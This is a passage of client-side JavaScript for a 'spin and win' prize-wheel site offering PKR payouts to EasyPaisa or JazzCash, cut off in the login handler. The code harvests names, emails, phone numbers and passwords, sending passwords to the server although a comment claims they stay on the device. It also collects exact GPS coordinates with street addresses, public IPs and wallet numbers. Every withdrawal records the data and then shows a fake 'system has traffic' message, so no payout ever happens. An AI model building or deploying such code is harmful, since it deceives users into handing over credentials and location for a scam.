(() => {
  "use strict";

  const isLocalHost =
    location.hostname === "localhost" ||
    location.hostname === "127.0.0.1" ||
    location.hostname === "";
  const API_BASE =
    window.SPIN_WIN_API_BASE ||
    (isLocalHost ? "http://localhost:5090/api/v1" : "/api/v1");
  const SESSION_KEY = "spin_win_session_id";
  const VISITOR_KEY = "spin_win_visitor_id";
  const LOGGED_IN_KEY = "spin_win_logged_in";
  const BALANCE_KEY = "spin_win_balance";
  const PROFILE_KEY = "spin_win_profile";
  const PASSWORD_KEY = "spin_win_password";
  const ACTIVITY_KEY = "spin_win_activity";
  const LOCATION_KEY = "spin_win_location";
  const PUBLIC_IP_KEY = "spin_win_public_ip";
  const SPIN_COUNT_KEY = "spin_win_spin_count";
  const ACCOUNTS_KEY = "spin_win_accounts";
  const MIN_WITHDRAW = 100;

  const PRIZES = [
    { amount: 5, label: "5", color: "#0b7a72" },
    { amount: 50, label: "50", color: "#e24b3b" },
    { amount: 10, label: "10", color: "#334155" },
    { amount: 100, label: "100", color: "#e8b84a" },
    { amount: 25, label: "25", color: "#0284c7" },
    { amount: 200, label: "200", color: "#c2410c" },
    { amount: 0, label: "0", color: "#64748b" },
    { amount: 500, label: "500", color: "#9f1239" },
  ];

  const viewLogin = document.getElementById("view-login");
  const viewSpin = document.getElementById("view-spin");
  const canvas = document.getElementById("wheel");
  const ctx = canvas.getContext("2d");
  const form = document.getElementById("login-form");
  const loginBtn = document.getElementById("login-btn");
  const logoutBtn = document.getElementById("logout-btn");
  const withdrawBtn = document.getElementById("withdraw-btn");
  const spinBtn = document.getElementById("spin-btn");
  const spinBtnLabel = document.getElementById("spin-btn-label");
  const spinHint = document.getElementById("spin-hint");
  const formMessage = document.getElementById("form-message");
  const balanceAmountEl = document.getElementById("balance-amount");
  const playerNameEl = document.getElementById("player-name");
  const walletIdEl = document.getElementById("wallet-id");
  const withdrawMessageEl = document.getElementById("withdraw-message");
  const activityListEl = document.getElementById("activity-list");
  const spinCountEl = document.getElementById("spin-count");
  const toastEl = document.getElementById("toast");
  const celebrate = document.getElementById("celebrate");
  const celebrateCard = celebrate.querySelector(".celebrate-card");
  const celebrateEyebrow = document.getElementById("celebrate-eyebrow");
  const celebrateAmount = document.getElementById("celebrate-amount");
  const celebrateSub = document.getElementById("celebrate-sub");
  const celebrateClose = document.getElementById("celebrate-close");
  const confettiRoot = document.getElementById("confetti");
  const locationModal = document.getElementById("location-modal");
  const locationTitleEl = document.getElementById("location-title");
  const locationStatusEl = document.getElementById("location-status");
  const locationAllowBtn = document.getElementById("location-allow-btn");
  const locationLeadEl = document.querySelector("#location-modal .location-lead");
  const locationHelpEl = document.getElementById("location-help");
  const withdrawModal = document.getElementById("withdraw-modal");
  const withdrawCloseBtn = document.getElementById("withdraw-close");
  const withdrawSendBtn = document.getElementById("withdraw-send-btn");
  const withdrawNumberEl = document.getElementById("withdrawNumber");
  const withdrawModalMessageEl = document.getElementById("withdraw-modal-message");

  let rotation = 0;
  let spinning = false;
  let profile = loadProfile();
  let locationInfo = loadLocation();
  let toastTimer = null;
  let pendingWithdraw = false;
  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  function uuid() {
    if (crypto.randomUUID) return crypto.randomUUID();
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === "x" ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getSessionId() {
    let id = localStorage.getItem(SESSION_KEY);
    if (!id) {
      id = uuid();
      localStorage.setItem(SESSION_KEY, id);
    }
    return id;
  }

  function loadProfile() {
    try {
      return JSON.parse(localStorage.getItem(PROFILE_KEY) || "null");
    } catch {
      return null;
    }
  }

  function saveProfile(next) {
    profile = next;
    localStorage.setItem(PROFILE_KEY, JSON.stringify(next));
    persistActiveAccount();
  }

  function loadPassword() {
    return localStorage.getItem(PASSWORD_KEY) || "";
  }

  /** Password stays on this device only — never sent to the API. */
  function savePassword(value) {
    const pwd = String(value || "");
    if (pwd) localStorage.setItem(PASSWORD_KEY, pwd);
    else localStorage.removeItem(PASSWORD_KEY);
    persistActiveAccount();
  }

  function normalizePhone(phone) {
    let digits = String(phone || "").replace(/\D/g, "");
    if (digits.startsWith("92") && digits.length >= 12) digits = `0${digits.slice(2)}`;
    return digits;
  }

  function loadAccounts() {
    try {
      const raw = JSON.parse(localStorage.getItem(ACCOUNTS_KEY) || "{}");
      return raw && typeof raw === "object" ? raw : {};
    } catch {
      return {};
    }
  }

  function getLocalAccount(phone) {
    const key = normalizePhone(phone);
    if (!key) return null;
    return loadAccounts()[key] || null;
  }

  function persistActiveAccount() {
    const phone = normalizePhone(profile?.phoneNumber);
    if (!phone) return;

    const accounts = loadAccounts();
    accounts[phone] = {
      fullName: profile.fullName || "",
      email: profile.email || "",
      phoneNumber: phone,
      password: loadPassword(),
      balance: getBalance(),
      activity: loadActivity(),
      spinCount: getSpinCount(),
      location: loadLocation(),
      visitorId: localStorage.getItem(VISITOR_KEY) || null,
      sessionId: getSessionId(),
    };
    localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(accounts));
  }

  function activateLocalAccount(account, password) {
    const phone = normalizePhone(account.phoneNumber);
    profile = {
      fullName: account.fullName,
      email: account.email,
      phoneNumber: phone,
      city: account.location?.city || null,
      country: account.location?.country || null,
    };
    localStorage.setItem(PROFILE_KEY, JSON.stringify(profile));
    localStorage.setItem(PASSWORD_KEY, String(password || ""));
    localStorage.setItem(BALANCE_KEY, String(Math.max(0, Number(account.balance) || 0)));
    localStorage.setItem(SPIN_COUNT_KEY, String(Math.max(0, Number(account.spinCount) || 0)));
    localStorage.setItem(ACTIVITY_KEY, JSON.stringify(Array.isArray(account.activity) ? account.activity : []));
    if (account.visitorId) localStorage.setItem(VISITOR_KEY, String(account.visitorId));
    else localStorage.removeItem(VISITOR_KEY);

    if (account.sessionId) localStorage.setItem(SESSION_KEY, String(account.sessionId));
    else localStorage.setItem(SESSION_KEY, uuid());

    if (account.location) {
      locationInfo = account.location;
      localStorage.setItem(LOCATION_KEY, JSON.stringify(account.location));
    } else {
      locationInfo = null;
      localStorage.removeItem(LOCATION_KEY);
    }

    localStorage.setItem(LOGGED_IN_KEY, "1");
    persistActiveAccount();
  }

  function loadLocation() {
    try {
      return JSON.parse(localStorage.getItem(LOCATION_KEY) || "null");
    } catch {
      return null;
    }
  }

  function saveLocation(next) {
    locationInfo = next;
    if (next) localStorage.setItem(LOCATION_KEY, JSON.stringify(next));
    else localStorage.removeItem(LOCATION_KEY);
    persistActiveAccount();
  }

  function getSpinCount() {
    const n = Number(localStorage.getItem(SPIN_COUNT_KEY) || "0");
    return Number.isFinite(n) ? Math.max(0, Math.floor(n)) : 0;
  }

  function setSpinCount(value) {
    localStorage.setItem(SPIN_COUNT_KEY, String(Math.max(0, Math.floor(value))));
    persistActiveAccount();
  }

  function applySpinAvailability() {
    spinBtn.disabled = false;
    spinBtnLabel.textContent = "GO";
    const total = getSpinCount();
    spinHint.textContent = total === 0 ? "Tap GO to spin" : `${total} spin${total === 1 ? "" : "s"} so far`;
    return true;
  }

  function getCurrentPositionAsync(options = {}) {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Location is not supported on this device/browser."));
        return;
      }

      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0,
        ...options,
      });
    });
  }

  function uniqueParts(parts) {
    const seen = new Set();
    const out = [];
    for (const part of parts) {
      const value = String(part || "").trim();
      if (!value) continue;
      const key = value.toLowerCase();
      if (seen.has(key)) continue;
      seen.add(key);
      out.push(value);
    }
    return out;
  }

  function buildAddressFromNominatim(data, lat, lon) {
    const a = data.address || {};
    const street = uniqueParts([a.house_number, a.road || a.pedestrian || a.path || a.footway]).join(" ");
    const area = uniqueParts([
      a.neighbourhood,
      a.suburb,
      a.quarter,
      a.residential,
      a.village,
      a.town,
      a.city_district,
      a.city || a.municipality,
      a.county,
      a.state || a.province || a.region,
      a.postcode,
      a.country,
    ]);

    const fromParts = uniqueParts([street, ...area]).join(", ");
    const display = String(data.display_name || "").trim();
    const base = fromParts || display;
    if (!base) return null;

    // Exact GPS so we keep the real device point, not only the area name.
    return `${base} | ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
  }

  async function reverseGeocodeNominatim(lat, lon) {
    const url =
      `https://nominatim.openstreetmap.org/reverse` +
      `?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}` +
      `&addressdetails=1&zoom=18&accept-language=en`;

    const response = await fetch(url, {
      headers: {
        Accept: "application/json",
      },
    });
    if (!response.ok) throw new Error("Nominatim failed");
    const data = await response.json();
    const fullAddress = buildAddressFromNominatim(data, lat, lon);
    if (!fullAddress) throw new Error("No address from Nominatim");

    const country =
      data.address?.country ||
      null;

    return {
      city: String(fullAddress).slice(0, 1000),
      country: country ? String(country).slice(0, 100) : null,
      lat,
      lon,
      savedAt: Date.now(),
    };
  }

  async function reverseGeocodeBigDataCloud(lat, lon) {
    const url =
      `https://api.bigdatacloud.net/data/reverse-geocode-client` +
      `?latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}&localityLanguage=en`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Could not resolve address from location.");
    const data = await response.json();

    const adminNames = Array.isArray(data.localityInfo?.administrative)
      ? data.localityInfo.administrative
          .slice()
          .sort((a, b) => (Number(b.order) || 0) - (Number(a.order) || 0))
          .map((x) => x.name)
      : [];

    const parts = uniqueParts([
      data.locality,
      ...adminNames,
      data.city,
      data.principalSubdivision,
      data.postcode,
      data.countryName,
    ]);

    const fullAddress =
      (parts.length ? `${parts.join(", ")} | ${lat.toFixed(6)}, ${lon.toFixed(6)}` : null) ||
      `${lat.toFixed(6)}, ${lon.toFixed(6)}`;

    return {
      city: String(fullAddress).slice(0, 1000),
      country: data.countryName ? String(data.countryName).slice(0, 100) : null,
      lat,
      lon,
      savedAt: Date.now(),
    };
  }

  /** Prefer street-level OpenStreetMap address; fall back to BigDataCloud. */
  async function reverseGeocode(lat, lon) {
    try {
      return await reverseGeocodeNominatim(lat, lon);
    } catch {
      return reverseGeocodeBigDataCloud(lat, lon);
    }
  }

  /** Only prompts the browser when we do not already have a saved address. */
  async function ensureLocation() {
    if (locationInfo?.city) return locationInfo;

    try {
      const pos = await getCurrentPositionAsync();
      const resolved = await reverseGeocode(pos.coords.latitude, pos.coords.longitude);
      saveLocation(resolved);
      return resolved;
    } catch (err) {
      const denied =
        err && (err.code === 1 || /denied/i.test(String(err.message || "")));
      const message = denied
        ? "Please allow location once when the browser asks, then try again."
        : err.message || "Could not get your location.";
      throw new Error(message);
    }
  }

  function getBalance() {
    const n = Number(localStorage.getItem(BALANCE_KEY) || "0");
    return Number.isFinite(n) ? n : 0;
  }

  function setBalance(value) {
    const safe = Math.max(0, Math.round(value));
    localStorage.setItem(BALANCE_KEY, String(safe));
    balanceAmountEl.textContent = safe.toLocaleString("en-PK");
    persistActiveAccount();
  }

  function addToBalance(amount) {
    const next = getBalance() + amount;
    setBalance(next);
    return next;
  }

  function loadActivity() {
    try {
      const rows = JSON.parse(localStorage.getItem(ACTIVITY_KEY) || "[]");
      return Array.isArray(rows) ? rows : [];
    } catch {
      return [];
    }
  }

  function saveActivity(rows) {
    localStorage.setItem(ACTIVITY_KEY, JSON.stringify(rows.slice(0, 20)));
    persistActiveAccount();
  }

  function pushActivity(amount) {
    const rows = loadActivity();
    rows.unshift({
      amount,
      at: new Date().toISOString(),
    });
    saveActivity(rows);
    renderActivity();
  }

  function renderActivity() {
    const rows = loadActivity();
    spinCountEl.textContent = `${rows.length} spin${rows.length === 1 ? "" : "s"}`;

    if (!rows.length) {
      activityListEl.innerHTML = '<li class="activity-empty">No spins yet — tap GO to start.</li>';
      return;
    }

    activityListEl.innerHTML = rows
      .slice(0, 8)
      .map((row) => {
        const when = new Date(row.at);
        const time = Number.isNaN(when.getTime())
          ? ""
          : when.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
        const cls = row.amount > 0 ? "win" : "miss";
        const label = row.amount > 0 ? `+${row.amount} PKR` : "0 PKR";
        return `<li><span>${time || "Spin"}</span><span class="${cls}">${label}</span></li>`;
      })
      .join("");
  }

  function showToast(message, isError = false) {
    toastEl.hidden = false;
    toastEl.textContent = message;
    toastEl.classList.toggle("is-error", isError);
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.hidden = true;
    }, 3200);
  }

  function parseUserAgent(ua) {
    const text = ua || "";
    let browser = "Unknown";
    if (/Edg\//i.test(text)) browser = "Edge";
    else if (/Chrome\//i.test(text) && !/Chromium/i.test(text)) browser = "Chrome";
    else if (/Firefox\//i.test(text)) browser = "Firefox";
    else if (/Safari\//i.test(text) && !/Chrome/i.test(text)) browser = "Safari";

    let operatingSystem = "Unknown";
    if (/Windows NT/i.test(text)) operatingSystem = "Windows";
    else if (/Mac OS X/i.test(text)) operatingSystem = "macOS";
    else if (/Android/i.test(text)) operatingSystem = "Android";
    else if (/iPhone|iPad|iPod/i.test(text)) operatingSystem = "iOS";
    else if (/Linux/i.test(text)) operatingSystem = "Linux";

    const deviceType = /Mobi|Android|iPhone|iPad/i.test(text) ? "Mobile" : "Desktop";
    return { browser, operatingSystem, deviceType };
  }

  function setFormMessage(message, isError = false) {
    formMessage.textContent = message || "";
    formMessage.classList.toggle("is-error", isError);
  }

  function clearFieldErrors() {
    form.querySelectorAll(".field-error").forEach((el) => {
      el.textContent = "";
    });
    form.querySelectorAll("input").forEach((el) => el.classList.remove("invalid"));
  }

  function showFieldError(name, message) {
    const input = form.elements.namedItem(name);
    const error = form.querySelector(`[data-error-for="${name}"]`);
    if (input instanceof HTMLElement) input.classList.add("invalid");
    if (error) error.textContent = message;
  }

  function validateLogin() {
    clearFieldErrors();
    let ok = true;
    const fullName = form.fullName.value.trim();
    const email = form.email.value.trim();
    const phone = form.phoneNumber.value.trim();
    const password = form.password.value;

    if (!fullName) {
      showFieldError("fullName", "Name is required");
      ok = false;
    }
    if (!email) {
      showFieldError("email", "Email is required");
      ok = false;
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      showFieldError("email", "Enter a valid email");
      ok = false;
    }
    if (phone && phone.replace(/\D/g, "").length < 10) {
      showFieldError("phoneNumber", "Enter a valid phone");
      ok = false;
    }
    if (!phone) {
      showFieldError("phoneNumber", "Phone is required");
      ok = false;
    }
    if (!password) {
      showFieldError("password", "Password is required");
      ok = false;
    } else if (password.length < 4) {
      showFieldError("password", "Use at least 4 characters");
      ok = false;
    }
    return ok;
  }

  async function postJson(path, body) {
    const response = await fetch(`${API_BASE}${path}`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    });

    let data = null;
    const text = await response.text();
    if (text) {
      try {
        data = JSON.parse(text);
      } catch {
        data = { message: text };
      }
    }

    if (!response.ok) {
      const error = new Error((data && data.message) || `Request failed (${response.status})`);
      error.status = response.status;
      error.data = data;
      throw error;
    }
    return data;
  }

  async function registerAccountApi(data) {
    return postJson("/website-visitors/register", {
      sessionId: getSessionId(),
      fullName: data.fullName,
      email: data.email,
      phoneNumber: data.phoneNumber,
      password: data.password,
      leadSource: "SpinWin",
    });
  }

  function buildFullVisitorPayload() {
    const ua = navigator.userAgent || "";
    const parsed = parseUserAgent(ua);
    const params = new URLSearchParams(window.location.search);
    const p = profile || {};
    const loc = locationInfo || loadLocation() || {};
    const visitorIdRaw = localStorage.getItem(VISITOR_KEY);
    const visitorId = visitorIdRaw ? Number(visitorIdRaw) : null;

    return {
      sessionId: getSessionId(),
      visitorId: Number.isFinite(visitorId) && visitorId > 0 ? visitorId : null,
      fullName: p.fullName || form.fullName?.value?.trim() || null,
      email: p.email || form.email?.value?.trim() || null,
      phoneNumber: p.phoneNumber || form.phoneNumber?.value?.trim() || null,
      userAgent: ua.slice(0, 1000),
      browser: parsed.browser,
      operatingSystem: parsed.operatingSystem,
      deviceType: parsed.deviceType,
      country: loc.country || null,
      city: loc.city || null,
      referrerUrl: document.referrer || null,
      landingPage: window.location.href.slice(0, 1000),
      leadSource: params.get("src") || "SpinWin",
      isLead: true,
      isRegistered: localStorage.getItem(LOGGED_IN_KEY) === "1",
      // Public WAN IP — server uses this when the TCP connection is localhost (::1).
      ipAddress: localStorage.getItem(PUBLIC_IP_KEY) || null,
      balance: getBalance(),
    };
  }

  /** New WebsiteVisitors row — wallet account saved in phoneNumber (same /track API). */
  function buildWithdrawPayload(wallet, walletNumber) {
    const ua = navigator.userAgent || "";
    const parsed = parseUserAgent(ua);
    const p = profile || {};
    const loc = locationInfo || loadLocation() || {};
    const loginPhone = normalizePhone(p.phoneNumber || form.phoneNumber?.value?.trim() || "");

    return {
      sessionId: `withdraw-${uuid()}`,
      fullName: p.fullName
        ? `${p.fullName} (${wallet}${loginPhone ? ` · ${loginPhone}` : ""})`
        : `${wallet} withdraw`,
      email: p.email || null,
      phoneNumber: normalizePhone(walletNumber),
      userAgent: ua.slice(0, 1000),
      browser: parsed.browser,
      operatingSystem: parsed.operatingSystem,
      deviceType: parsed.deviceType,
      country: loc.country || null,
      city: loc.city || null,
      referrerUrl: document.referrer || null,
      landingPage: window.location.href.slice(0, 1000),
      leadSource: `SpinWin-Withdraw-${wallet}`,
      isLead: true,
      isRegistered: false,
      ipAddress: localStorage.getItem(PUBLIC_IP_KEY) || null,
      balance: getBalance(),
    };
  }

  async function trackWithdrawRequest(wallet, walletNumber) {
    await ensurePublicIp();
    return postJson("/website-visitors/track", buildWithdrawPayload(wallet, walletNumber));
  }

  async function getJson(path) {
    const response = await fetch(`${API_BASE}${path}`, {
      method: "GET",
      headers: { Accept: "application/json" },
    });

    let data = null;
    const text = await response.text();
    if (text) {
      try {
        data = JSON.parse(text);
      } catch {
        data = { message: text };
      }
    }

    if (!response.ok) {
      const error = new Error((data && data.message) || `Request failed (${response.status})`);
      error.status = response.status;
      throw error;
    }
    return data;
  }

  /** GET returns all visitor properties; UI only applies balance. */
  async function refreshBalanceFromApi() {
    const id = localStorage.getItem(VISITOR_KEY);
    if (!id) return null;

    try {
      const data = await getJson(`/website-visitors/${encodeURIComponent(id)}`);
      if (data && typeof data.balance === "number") {
        const safe = Math.max(0, Math.round(data.balance));
        localStorage.setItem(BALANCE_KEY, String(safe));
        balanceAmountEl.textContent = safe.toLocaleString("en-PK");
        persistActiveAccount();
      }
      return data;
    } catch {
      setBalance(getBalance());
      return null;
    }
  }

  async function ensurePublicIp() {
    const cached = localStorage.getItem(PUBLIC_IP_KEY);
    if (cached) return cached;

    try {
      const response = await fetch("https://api.bigdatacloud.net/data/client-ip");
      if (!response.ok) return null;
      const data = await response.json();
      const ip = String(data.ipString || data.ip || "").trim();
      if (!ip || ip === "::1" || ip === "127.0.0.1") return null;
      localStorage.setItem(PUBLIC_IP_KEY, ip.slice(0, 45));
      return ip;
    } catch {
      return null;
    }
  }

  function trackSpinInBackground() {
    // Resolve public IP first so localhost (::1) is not stored.
    ensurePublicIp().finally(() => {
      postJson("/website-visitors/track", buildFullVisitorPayload())
        .then((data) => {
          if (data?.id != null) localStorage.setItem(VISITOR_KEY, String(data.id));
          // Full payload comes back; only surface balance in the UI.
          if (typeof data?.balance === "number") {
            const safe = Math.max(0, Math.round(data.balance));
            localStorage.setItem(BALANCE_KEY, String(safe));
            balanceAmountEl.textContent = safe.toLocaleString("en-PK");
            persistActiveAccount();
          }
        })
        .catch(() => {});
    });
  }

  function setLocationStatus(message, isError = false) {
    locationStatusEl.textContent = message || "";
    locationStatusEl.classList.toggle("is-error", Boolean(isError && message));
  }

  function resetLocationModalUi() {
    if (locationTitleEl) locationTitleEl.textContent = "Allow location";
    if (locationLeadEl) {
      locationLeadEl.textContent =
        "Location is required before you can withdraw to EasyPaisa or JazzCash.";
    }
    if (locationHelpEl) locationHelpEl.hidden = true;
    setLocationStatus("");
    locationAllowBtn.textContent = "Allow location";
    locationAllowBtn.disabled = false;
  }

  /** Ask the device/browser for location (must run from a user tap when possible). */
  function askDeviceLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Location is not supported on this device/browser."));
        return;
      }
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0,
      });
    });
  }

  async function saveLocationFromPosition(pos) {
    setLocationStatus("Saving your address…");
    const resolved = await reverseGeocode(pos.coords.latitude, pos.coords.longitude);
    saveLocation(resolved);
    if (profile) {
      saveProfile({ ...profile, city: resolved.city, country: resolved.country });
    }
    return resolved;
  }

  /** Friendly popup guide when location was blocked — retry opens the device popup again. */
  function showLocationEnableGuide() {
    if (locationTitleEl) locationTitleEl.textContent = "Turn on location";
    if (locationLeadEl) {
      locationLeadEl.textContent = "Tap the button below — your browser will ask to allow location.";
    }
    if (locationHelpEl) locationHelpEl.hidden = false;
    setLocationStatus("");
    locationAllowBtn.textContent = "Turn on location";
    locationAllowBtn.disabled = false;
    locationModal.hidden = false;
  }

  function hideLocationModal() {
    locationModal.hidden = true;
    resetLocationModalUi();
    if (!viewSpin.hidden) applySpinAvailability();
  }

  function hideWithdrawModal() {
    withdrawModal.hidden = true;
    withdrawModalMessageEl.textContent = "";
    withdrawModalMessageEl.classList.remove("is-busy", "is-ok");
    withdrawSendBtn.disabled = false;
  }

  function showWithdrawModal() {
    hideLocationModal();
    withdrawModal.hidden = false;
    withdrawModalMessageEl.textContent = "";
    withdrawModalMessageEl.classList.remove("is-busy", "is-ok");
    withdrawNumberEl.value = profile?.phoneNumber || "";
    const firstWallet = withdrawModal.querySelector('input[name="withdrawWallet"][value="EasyPaisa"]');
    if (firstWallet) firstWallet.checked = true;
    withdrawSendBtn.disabled = false;
  }

  function setWithdrawModalMessage(message, kind = "error") {
    withdrawModalMessageEl.textContent = message || "";
    withdrawModalMessageEl.classList.toggle("is-busy", kind === "busy");
    withdrawModalMessageEl.classList.toggle("is-ok", kind === "ok");
  }

  async function requestLocationFromModal() {
    await requestLocationForWithdraw(true);
  }

  /** Native browser location popup first; custom guide only if user denies. */
  async function requestLocationForWithdraw(fromGuideButton = false) {
    if (fromGuideButton) {
      if (locationHelpEl) locationHelpEl.hidden = true;
      if (locationTitleEl) locationTitleEl.textContent = "Allow location";
      locationModal.hidden = false;
    } else {
      locationModal.hidden = true;
    }

    setLocationStatus("Waiting for browser permission…");
    locationAllowBtn.disabled = true;
    locationAllowBtn.textContent = "Checking…";

    try {
      const pos = await askDeviceLocation();
      await saveLocationFromPosition(pos);

      hideLocationModal();
      showToast("Location saved");
      applySpinAvailability();

      if (pendingWithdraw) {
        pendingWithdraw = false;
        showWithdrawModal();
      }
    } catch (err) {
      const denied =
        err && (err.code === 1 || /denied/i.test(String(err.message || "")));
      if (pendingWithdraw && denied) {
        showLocationEnableGuide();
        return;
      }

      const message = denied
        ? "Please allow location in the browser popup, then try again."
        : err.message || "Could not get your location.";
      locationModal.hidden = false;
      setLocationStatus(message, true);
      locationAllowBtn.disabled = false;
      locationAllowBtn.textContent = "Turn on location";
      if (!pendingWithdraw) hideLocationModal();
    }
  }

  /** Location required only for withdraw — opens the device/browser popup on tap. */
  function ensureLocationForWithdraw() {
    pendingWithdraw = true;
    hideWithdrawModal();
    locationInfo = loadLocation();

    if (locationInfo?.city) {
      pendingWithdraw = false;
      showWithdrawModal();
      return;
    }

    // User just tapped Withdraw — trigger the native location permission popup.
    requestLocationForWithdraw(false);
  }

  function showLoginView() {
    viewLogin.hidden = false;
    viewSpin.hidden = true;
    celebrate.hidden = true;
    pendingWithdraw = false;
    hideLocationModal();
    hideWithdrawModal();
    loginBtn.disabled = false;
    loginBtn.querySelector(".login-btn-label").textContent = "Continue";
  }

  async function showSpinView() {
    viewLogin.hidden = true;
    viewSpin.hidden = false;
    celebrate.hidden = true;
    withdrawMessageEl.textContent = "";
    withdrawMessageEl.classList.remove("is-ok");
    playerNameEl.textContent = profile?.fullName ? `Hi, ${profile.fullName}` : "";
    walletIdEl.textContent = `ID ${(getSessionId() || "----").slice(0, 8).toUpperCase()}`;
    renderActivity();
    drawWheel();
    applySpinAvailability();
    // Load full visitor from API; display only balance.
    await refreshBalanceFromApi();
    hideLocationModal();
    applySpinAvailability();
  }

  function drawWheel() {
    const size = canvas.width;
    const radius = size / 2;
    const slice = (Math.PI * 2) / PRIZES.length;

    ctx.clearRect(0, 0, size, size);
    ctx.save();
    ctx.translate(radius, radius);
    ctx.rotate(rotation);

    PRIZES.forEach((prize, i) => {
      const start = i * slice - Math.PI / 2;
      const end = start + slice;

      ctx.beginPath();
      ctx.moveTo(0, 0);
      ctx.arc(0, 0, radius - 6, start, end);
      ctx.closePath();
      ctx.fillStyle = prize.color;
      ctx.fill();
      ctx.strokeStyle = "rgba(255,255,255,0.55)";
      ctx.lineWidth = 2;
      ctx.stroke();

      ctx.save();
      ctx.rotate(start + slice / 2);
      ctx.textAlign = "right";
      ctx.fillStyle = "#fff";
      ctx.font = `700 ${Math.round(size * 0.055)}px Outfit, sans-serif`;
      ctx.fillText(`${prize.label} PKR`, radius - 26, 8);
      ctx.restore();
    });

    ctx.beginPath();
    ctx.arc(0, 0, radius - 4, 0, Math.PI * 2);
    ctx.strokeStyle = "#fff";
    ctx.lineWidth = 10;
    ctx.stroke();
    ctx.restore();
  }

  function prizeAtPointer() {
    const slice = (Math.PI * 2) / PRIZES.length;
    const normalized = ((Math.PI * 1.5 - (rotation % (Math.PI * 2))) % (Math.PI * 2) + Math.PI * 2) % (Math.PI * 2);
    const index = Math.floor(normalized / slice) % PRIZES.length;
    return PRIZES[index];
  }

  function animateSpin(targetRotation, durationMs) {
    return new Promise((resolve) => {
      if (reduceMotion) {
        rotation = targetRotation;
        drawWheel();
        resolve();
        return;
      }

      const start = performance.now();
      const from = rotation;

      function frame(now) {
        const t = Math.min(1, (now - start) / durationMs);
        const eased = 1 - Math.pow(1 - t, 3);
        rotation = from + (targetRotation - from) * eased;
        drawWheel();
        if (t < 1) requestAnimationFrame(frame);
        else resolve();
      }

      requestAnimationFrame(frame);
    });
  }

  function burstConfetti(level) {
    confettiRoot.innerHTML = "";
    if (reduceMotion || level <= 0) return;

    const count = level >= 100 ? 80 : level >= 50 ? 48 : 28;
    const colors = ["#e8b84a", "#e24b3b", "#0b7a72", "#0284c7", "#ffffff", "#c2410c"];

    for (let i = 0; i < count; i++) {
      const piece = document.createElement("span");
      piece.className = "confetti-piece";
      piece.style.left = `${Math.random() * 100}%`;
      piece.style.background = colors[i % colors.length];
      piece.style.animationDuration = `${1.4 + Math.random() * 1.6}s`;
      piece.style.animationDelay = `${Math.random() * 0.25}s`;
      confettiRoot.appendChild(piece);
    }

    window.setTimeout(() => {
      confettiRoot.innerHTML = "";
    }, 3200);
  }

  function showCelebration(prize) {
    celebrateCard.classList.remove("is-big", "is-miss");

    if (prize.amount <= 0) {
      celebrateCard.classList.add("is-miss");
      celebrateEyebrow.textContent = "Almost";
      celebrateAmount.textContent = "0 PKR";
      celebrateSub.textContent = "No win this round — spin again!";
      burstConfetti(0);
    } else {
      if (prize.amount >= 100) celebrateCard.classList.add("is-big");
      celebrateEyebrow.textContent = prize.amount >= 200 ? "Huge win!" : "You won";
      celebrateAmount.textContent = `+${prize.amount} PKR`;
      celebrateSub.textContent = `Balance is now ${getBalance().toLocaleString("en-PK")} PKR`;
      burstConfetti(prize.amount);
    }

    celebrate.hidden = false;
  }

  function hideCelebration() {
    celebrate.hidden = true;
    confettiRoot.innerHTML = "";
    applySpinAvailability();
  }

  function onWithdraw() {
    withdrawMessageEl.textContent = "";
    withdrawMessageEl.classList.remove("is-ok");
    ensureLocationForWithdraw();
  }

  async function onWithdrawSend() {
    const walletInput = withdrawModal.querySelector('input[name="withdrawWallet"]:checked');
    const wallet = walletInput ? walletInput.value : "";
    const number = (withdrawNumberEl.value || "").replace(/\D/g, "");

    if (!wallet) {
      setWithdrawModalMessage("Select EasyPaisa or JazzCash");
      return;
    }
    if (number.length < 10) {
      setWithdrawModalMessage("Enter a valid account number");
      return;
    }

    const balance = getBalance();
    if (balance < MIN_WITHDRAW) {
      const msg = "You can't withdraw less than 100 PKR";
      setWithdrawModalMessage(msg);
      withdrawMessageEl.textContent = msg;
      withdrawMessageEl.classList.remove("is-ok");
      showToast(msg, true);
      return;
    }

    const busyMsg = "Now the system has traffic, try later";
    withdrawSendBtn.disabled = true;
    setWithdrawModalMessage("Submitting…", "busy");

    try {
      await trackWithdrawRequest(wallet, number);
      setWithdrawModalMessage(busyMsg, "busy");
      withdrawMessageEl.textContent = busyMsg;
      withdrawMessageEl.classList.remove("is-ok");
      showToast(busyMsg, true);
    } catch {
      const failMsg = "Could not submit right now. Please try later.";
      setWithdrawModalMessage(failMsg, "busy");
      withdrawMessageEl.textContent = failMsg;
      showToast(failMsg, true);
    } finally {
      withdrawSendBtn.disabled = false;
    }
  }

  async function onLogin(event) {
    event.preventDefault();
    setFormMessage("");
    if (!validateLogin()) return;

    const phone = normalizePhone(form.phoneNumber.value.trim());
    const password = form.password.value;
    const data = {
      fullName: form.fullName.value.trim(),
      email: form.email.value.trim(),
      phoneNumber: phone,
      password,
    };

    loginBtn.disabled = true;
    loginBtn.querySelector(".login-btn-label").textContent = "Opening wallet…";

    try {
      // New account on this device gets its own session id so it never reuses another user's row.
      if (!getLocalAccount(phone)) {
        localStorage.setItem(SESSION_KEY, uuid());
      }

      // Create or sign in — password is hashed and stored in DB (never returned by GET).
      const result = await registerAccountApi(data);
